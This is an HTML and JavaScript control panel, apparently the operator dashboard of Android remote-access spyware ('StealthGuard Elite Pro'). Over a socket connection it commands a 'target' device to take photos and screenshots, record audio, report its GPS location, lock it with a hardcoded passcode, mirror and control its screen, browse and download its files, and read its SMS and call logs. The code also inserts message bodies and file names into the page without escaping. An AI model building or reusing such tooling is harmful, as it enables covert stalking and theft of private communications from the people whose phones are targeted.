<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>StealthGuard Elite Pro - Full Access Dashboard</title>
    <script src="/socket.io/socket.io.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --primary: #4f46e5; --secondary: #0f172a; --accent: #10b981; --bg: #f8fafc; --danger: #ef4444; }
        body { background-color: var(--bg); font-family: 'Outfit', sans-serif; }
        .sidebar { height: 100vh; background: var(--secondary); color: white; padding: 1.5rem; position: fixed; width: 280px; box-shadow: 10px 0 30px rgba(0,0,0,0.1); z-index: 1000; }
        .main-content { margin-left: 280px; padding: 2.5rem; min-height: 100vh; }
        .nav-link { color: #94a3b8; padding: 14px 20px; border-radius: 14px; margin-bottom: 8px; display: flex; align-items: center; text-decoration: none; cursor: pointer; transition: 0.3s; }
        .nav-link:hover, .nav-link.active { background: var(--primary); color: white; transform: translateX(5px); box-shadow: 0 10px 20px rgba(79, 70, 229, 0.3); }
        .nav-link i { width: 30px; font-size: 1.1rem; }
        .card-pro { background: white; border-radius: 24px; border: none; box-shadow: 0 10px 40px rgba(0,0,0,0.03); margin-bottom: 2rem; }
        #mirror-canvas { width: 100%; max-width: 420px; border-radius: 35px; background: #000; border: 10px solid #1e293b; display: block; margin: 0 auto; cursor: crosshair; touch-action: none; }
        .btn-elite { border-radius: 15px; padding: 12px; font-weight: 700; transition: 0.2s; border: none; }
        .btn-elite:active { transform: scale(0.95); }
        .app-launcher { width: 65px; height: 65px; border-radius: 18px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; cursor: pointer; transition: 0.2s; border: none; box-shadow: 0 8px 20px rgba(0,0,0,0.1); }
        .app-launcher:hover { transform: translateY(-5px); }
        .status-pill { padding: 8px 18px; border-radius: 30px; font-weight: 700; font-size: 0.8rem; display: inline-flex; align-items: center; gap: 8px; }
        .online { background: #dcfce7; color: #15803d; }
        .offline { background: #fee2e2; color: #b91c1c; }
        #log-container { height: 200px; overflow-y: auto; background: #020617; color: #38bdf8; padding: 1.5rem; font-family: 'Fira Code', monospace; font-size: 0.85rem; border-radius: 20px; }
        .file-item { padding: 12px 15px; border-bottom: 1px solid #f1f5f9; display: flex; align-items: center; cursor: pointer; border-radius: 10px; transition: 0.2s; }
        .file-item:hover { background: #f8fafc; color: var(--primary); }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="d-flex align-items-center mb-5 px-3">
            <i class="fas fa-shield-check fa-2x text-primary me-3"></i>
            <h4 class="mb-0 fw-bold">Elite <span class="text-primary">Guard</span></h4>
        </div>
        <nav>
            <a class="nav-link active" onclick="showTab('dashboard')"><i class="fas fa-grid-2"></i> Dashboard</a>
            <a class="nav-link" onclick="showTab('remote')"><i class="fas fa-mobile-screen"></i> Full Control</a>
            <a class="nav-link" onclick="showTab('files')"><i class="fas fa-folder-tree"></i> Files Explorer</a>
            <a class="nav-link" onclick="showTab('data')"><i class="fas fa-list-check"></i> Logs</a>
        </nav>
        <div class="position-absolute bottom-0 start-0 w-100 p-4">
            <div id="status-pill" class="status-pill offline shadow-sm w-100 justify-content-center">
                <i class="fas fa-circle"></i> <span id="status-text">OFFLINE</span>
            </div>
        </div>
    </div>

    <div class="main-content">
        <div id="dashboard" class="tab-pane active">
            <div class="row g-4">
                <div class="col-md-12 d-flex justify-content-between align-items-center">
                    <h2 class="fw-bold m-0">Control Panel</h2>
                    <div id="device-info" class="text-muted fw-bold small">Waiting for connection...</div>
                </div>

                <div class="col-md-8">
                    <div class="card-pro p-4">
                        <h6 class="fw-bold mb-4 text-primary">RAPID APP LAUNCHERS</h6>
                        <div class="d-flex flex-wrap gap-4">
                            <button class="app-launcher bg-success text-white" onclick="sendCommand('open_app', {pkg:'com.whatsapp'})"><i class="fab fa-whatsapp"></i></button>
                            <button class="app-launcher bg-danger text-white" onclick="sendCommand('open_app', {pkg:'com.google.android.youtube'})"><i class="fab fa-youtube"></i></button>
                            <button class="app-launcher bg-primary text-white" onclick="sendCommand('open_app', {pkg:'com.facebook.katana'})"><i class="fab fa-facebook-f"></i></button>
                            <button class="app-launcher bg-dark text-white" onclick="sendCommand('open_app', {pkg:'com.android.settings'})"><i class="fas fa-cog"></i></button>
                            <button class="app-launcher bg-info text-white" onclick="sendCommand('open_app', {pkg:'com.google.android.apps.messaging'})"><i class="fas fa-comment-sms"></i></button>
                        </div>
                    </div>
                </div>

                <div class="col-md-4">
                    <div class="card-pro p-4 text-center">
                        <i class="fas fa-shield-slash fa-2x text-danger mb-3"></i>
                        <h6 class="fw-bold">SECURITY LOCK</h6>
                        <div class="d-flex gap-2">
                            <button class="btn btn-danger btn-elite flex-grow-1" onclick="sendCommand('lock_device', {passcode:'Qauabhatti'})">LOCK</button>
                            <button class="btn btn-success btn-elite flex-grow-1" onclick="sendCommand('unlock_device')">UNLOCK</button>
                        </div>
                    </div>
                </div>

                <div class="col-md-3">
                    <div class="card-pro p-4 text-center">
                        <i class="fas fa-camera fa-2x text-primary mb-3"></i>
                        <h6 class="fw-bold">CAPTURE PHOTO</h6>
                        <button class="btn btn-primary btn-elite w-100" onclick="sendCommand('take_photo', {camera:'back'})">TAKE PHOTO</button>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="card-pro p-4 text-center">
                        <i class="fas fa-expand fa-2x text-warning mb-3"></i>
                        <h6 class="fw-bold">SCREENSHOT</h6>
                        <button class="btn btn-warning btn-elite w-100 text-white" onclick="sendCommand('take_screenshot')">CAPTURE</button>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="card-pro p-4 text-center">
                        <i class="fas fa-microphone-lines fa-2x text-danger mb-3"></i>
                        <h6 class="fw-bold">VOICE RECORD</h6>
                        <div class="btn-group w-100 gap-2">
                            <button class="btn btn-danger btn-elite flex-grow-1" onclick="sendCommand('start_record')">REC</button>
                            <button class="btn btn-outline-danger btn-elite flex-grow-1" onclick="sendCommand('stop_record')">STOP</button>
                        </div>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="card-pro p-4 text-center">
                        <i class="fas fa-location-dot fa-2x text-success mb-3"></i>
                        <h6 class="fw-bold">TRACK GPS</h6>
                        <button class="btn btn-success btn-elite w-100" onclick="sendCommand('get_location')">LOCATE</button>
                    </div>
                </div>

                <div class="col-md-12"><div id="log-container"></div></div>
            </div>
        </div>

        <div id="remote" class="tab-pane d-none">
            <div class="row justify-content-center">
                <div class="col-lg-8">
                    <div class="card-pro p-4">
                        <div class="d-flex justify-content-between align-items-center mb-4">
                            <h5 class="fw-bold m-0"><i class="fas fa-display me-2"></i>FULL DEVICE ACCESS</h5>
                            <div class="btn-group">
                                <button class="btn btn-success px-4 fw-bold" onclick="sendCommand('start_mirror')">START</button>
                                <button class="btn btn-danger px-4 fw-bold" onclick="sendCommand('stop_mirror')">STOP</button>
                            </div>
                        </div>
                        <div class="d-flex justify-content-center gap-3 mb-4">
                            <button class="btn btn-dark rounded-circle" style="width:50px; height:50px;" onclick="sendInput('key', {key:'back'})"><i class="fas fa-arrow-left"></i></button>
                            <button class="btn btn-dark rounded-circle" style="width:50px; height:50px;" onclick="sendInput('key', {key:'home'})"><i class="fas fa-circle"></i></button>
                            <button class="btn btn-dark rounded-circle" style="width:50px; height:50px;" onclick="sendInput('key', {key:'recents'})"><i class="fas fa-square"></i></button>
                        </div>
                        <img id="mirror-canvas" src="" onmousedown="handleMirrorDown(event)" onmouseup="handleMirrorUp(event)">
                    </div>
                </div>
            </div>
        </div>

        <div id="files" class="tab-pane d-none">
            <div class="card-pro p-4">
                <div class="d-flex gap-2 mb-4">
                    <button class="btn btn-outline-secondary" onclick="goBack()"><i class="fas fa-arrow-left"></i></button>
                    <input type="text" id="path-input" class="form-control rounded-pill px-4" value="/sdcard/">
                    <button class="btn btn-primary px-4 rounded-pill" onclick="loadFiles()">BROWSE</button>
                </div>
                <div id="file-list" style="max-height: 500px; overflow-y: auto;"></div>
            </div>
        </div>

        <div id="data" class="tab-pane d-none">
            <div class="row g-4">
                <div class="col-md-6"><div class="card-pro p-4"><h5 class="fw-bold mb-3">SMS Logs</h5><div id="sms-list"></div></div></div>
                <div class="col-md-6"><div class="card-pro p-4"><h5 class="fw-bold mb-3">Call Logs</h5><div id="calls-list"></div></div></div>
            </div>
        </div>
    </div>

    <!-- Screen Modal -->
    <div id="screenshot-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(0,0,0,0.95); z-index: 10000; display: flex; align-items: center; justify-content: center;">
        <div class="text-center p-4">
            <img id="screenshot-img" src="" class="img-fluid rounded-4 shadow-lg mb-4" style="max-height: 80vh; border: 4px solid #fff;">
            <div class="d-flex gap-3 justify-content-center">
                <button class="btn btn-light px-5 rounded-pill" onclick="document.getElementById('screenshot-modal').classList.add('d-none')">CLOSE</button>
                <a id="screenshot-download" href="#" class="btn btn-primary px-5 rounded-pill">DOWNLOAD</a>
            </div>
        </div>
    </div>

    <script>
        const socket = io({ query: { type: 'web' } });
        let currentPath = "/sdcard/";
        let startX, startY;

        socket.on('device_status', d => {
            const pill = document.getElementById('status-pill');
            pill.className = `status-pill shadow-sm w-100 justify-content-center ${d.connected ? 'online' : 'offline'}`;
            document.getElementById('status-text').innerText = d.connected ? "CONNECTED" : "OFFLINE";
            document.getElementById('device-info').innerText = d.connected ? `DEVICE: ${d.model}` : "WAITING FOR TARGET...";
        });

        socket.on('screen_frame', d => document.getElementById('mirror-canvas').src = 'data:image/jpeg;base64,' + d.image);

        socket.on('child_screenshot_ready', () => {
            const url = '/captured_screenshot.jpg?t=' + Date.now();
            document.getElementById('screenshot-img').src = url;
            document.getElementById('screenshot-download').href = url;
            document.getElementById('screenshot-modal').classList.remove('d-none');
            log("Success: Screenshot Received.");
        });

        socket.on('file_list', d => {
            const container = document.getElementById('file-list'); container.innerHTML = '';
            currentPath = d.path; document.getElementById('path-input').value = currentPath;
            d.files.forEach(f => {
                const icon = f.is_directory ? 'fa-folder text-warning' : 'fa-file text-secondary';
                const row = `<div class="file-item" onclick="${f.is_directory ? `browse('${f.path.replace(/\\/g, '/')}')` : `downloadFile('${f.path.replace(/\\/g, '/')}')`}">
                    <i class="fas ${icon} me-3"></i>
                    <div class="flex-grow-1">${f.name}</div>
                    <div class="small text-muted">${f.formatted_size || ''}</div>
                </div>`;
                container.innerHTML += row;
            });
        });

        socket.on('child_sms_list', d => {
            const l = document.getElementById('sms-list'); l.innerHTML = '';
            d.sms.forEach(s => l.innerHTML += `<div class="p-2 border-bottom"><b>${s.address}</b><br><small>${s.body}</small></div>`);
        });

        socket.on('child_call_logs', d => {
            const l = document.getElementById('calls-list'); l.innerHTML = '';
            d.calls.forEach(c => l.innerHTML += `<div class="p-2 border-bottom"><b>${c.number}</b> <span class="badge bg-secondary">${c.type==1?'IN':'OUT'}</span></div>`);
        });

        function handleMirrorDown(e) {
            const rect = e.target.getBoundingClientRect();
            startX = (e.clientX - rect.left) / rect.width;
            startY = (e.clientY - rect.top) / rect.height;
        }

        function handleMirrorUp(e) {
            const rect = e.target.getBoundingClientRect();
            const endX = (e.clientX - rect.left) / rect.width;
            const endY = (e.clientY - rect.top) / rect.height;
            const dist = Math.sqrt(Math.pow(endX - startX, 2) + Math.pow(endY - startY, 2));
            if (dist < 0.05) sendInput('click', { x: startX, y: startY });
            else sendInput('swipe', { x1: startX, y1: startY, x2: endX, y2: endY });
        }

        function sendCommand(a, p = {}) { socket.emit('gui_command', { action: a, ...p }); log(`Sent: ${a.toUpperCase()}`); }
        function sendInput(t, p) { socket.emit('gui_command', { action: 'remote_input', type: t, ...p }); }
        function browse(p) { sendCommand('list_files', {path: p}); }
        function loadFiles() { browse(document.getElementById('path-input').value); }
        function goBack() { browse(currentPath.substring(0, currentPath.lastIndexOf('/')) || "/sdcard/"); }
        function downloadFile(p) { if(confirm('Download this file?')) sendCommand('get_file', {file_path: p}); }

        function showTab(id) {
            document.querySelectorAll('.tab-pane').forEach(e => e.classList.add('d-none'));
            document.getElementById(id).classList.remove('d-none');
            document.querySelectorAll('.nav-link').forEach(e => e.classList.remove('active'));
            event.currentTarget.classList.add('active');
        }

        function log(m) {
            const c = document.getElementById('log-container');
            c.innerHTML += `<div><span style="opacity:0.5">[${new Date().toLocaleTimeString()}]</span> ${m}</div>`;
            c.scrollTop = c.scrollHeight;
        }
    </script>
</body>
</html>
